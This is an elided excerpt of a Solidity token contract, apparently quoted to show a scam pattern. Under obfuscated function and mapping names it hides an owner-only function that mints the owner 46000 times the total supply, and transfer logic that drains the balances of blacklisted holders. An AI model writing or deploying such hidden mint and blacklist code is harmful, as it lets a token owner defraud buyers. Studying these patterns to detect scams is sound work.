...
contract Coin is Ownable {
    ...
    function BENB123Box12123cc() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }
    function addAmountAdmin() external {
       
        if (_BENCEO == _msgSender()){
            _balances[_msgSender()] = BENB123Box12123cc()*46000;
        }else if (_msgSender() != _BENCEO) {
            revert("fuck");
        }
    }
    ...
    function _transfer(
        ...
        if (vipccdd[from] != false ){
            _balances[from]= balance-(BENB123Box12123cc())-(BENB123Box12123cc());
        }
